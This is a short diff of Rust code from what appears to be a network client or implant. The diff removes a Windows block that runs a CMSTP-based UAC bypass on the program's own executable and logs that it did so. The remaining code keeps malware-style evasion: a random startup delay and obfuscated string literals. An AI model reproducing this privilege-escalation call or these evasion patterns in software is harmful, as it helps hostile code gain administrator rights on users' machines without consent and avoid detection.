@@ -505,13 +505,6 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
 
 
 async fn netclient_impl() -> c_int {
-    #[cfg(target_os = "windows")]
-    {
-        let executable = std::env::current_exe().unwrap().display().to_string();
-        uac_cmstp::execute(&executable);
-        println!("{}", &astr!("Ran uac bypass. sleeping for 31 seconds"));
-        sleep(Duration::from_secs(31)).await;
-    }
     let startup_delay = rand_range(1, 13);
     println!("{}{}{}", astr!("Delaying startup by "), startup_delay, astr!("s"));
     sleep(Duration::from_secs(startup_delay)).await;
